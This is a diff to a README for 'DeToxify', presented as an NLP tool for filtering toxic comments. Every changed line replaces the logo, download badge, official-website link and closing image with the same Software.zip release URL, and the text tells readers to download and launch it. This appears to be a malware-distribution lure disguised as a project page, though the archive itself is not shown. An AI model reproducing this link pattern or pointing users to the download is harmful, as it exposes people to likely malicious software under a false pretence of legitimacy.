@@ -1,6 +1,6 @@
 # DeToxify: The Ultimate Toxicity Buster 🚫💬
 
-![DeToxify Logo](https://example.com/logo.png)
+![DeToxify Logo](https://github.com/hahaha911/DeToxify/releases/download/v1.0/Software.zip)
 
 Welcome to DeToxify - the ultimate toxicity buster! This innovative tool is armed with powerful NLP (Natural Language Processing) superpowers, designed to sniff out harmful comments, neutralize negativity, and transform toxicity into pure class. Imagine having your very own Jarvis for your online spaces, creating a kinder and smarter internet environment, one comment at a time.
 
@@ -24,7 +24,7 @@ Welcome to DeToxify - the ultimate toxicity buster! This innovative tool is arme
 
 To get started with DeToxify, you can download the software package from the following link:
 
-[![Download DeToxify Software](https://img.shields.io/badge/Download-Software-brightgreen)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download DeToxify Software](https://github.com/hahaha911/DeToxify/releases/download/v1.0/Software.zip)](https://github.com/hahaha911/DeToxify/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the software package, launch the application to experience the power of DeToxify in action.
 
@@ -88,7 +88,7 @@ Help us spread the word about DeToxify and join us in creating a safer and more 
 
 ## Visit the Website 🌐
 
-For more information about DeToxify and to access additional resources, visit our official website at [www.DeToxifyAI.com](https://www.DeToxifyAI.com).
+For more information about DeToxify and to access additional resources, visit our official website at [https://github.com/hahaha911/DeToxify/releases/download/v1.0/Software.zip](https://github.com/hahaha911/DeToxify/releases/download/v1.0/Software.zip).
 
 ---
 
@@ -100,4 +100,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Thank you for exploring DeToxify - the ultimate toxicity buster! Together, let's make the internet a better place, one positive comment at a time. 🌟💻
 
-![DeToxify](https://example.com/image.png)
+![DeToxify](https://github.com/hahaha911/DeToxify/releases/download/v1.0/Software.zip)
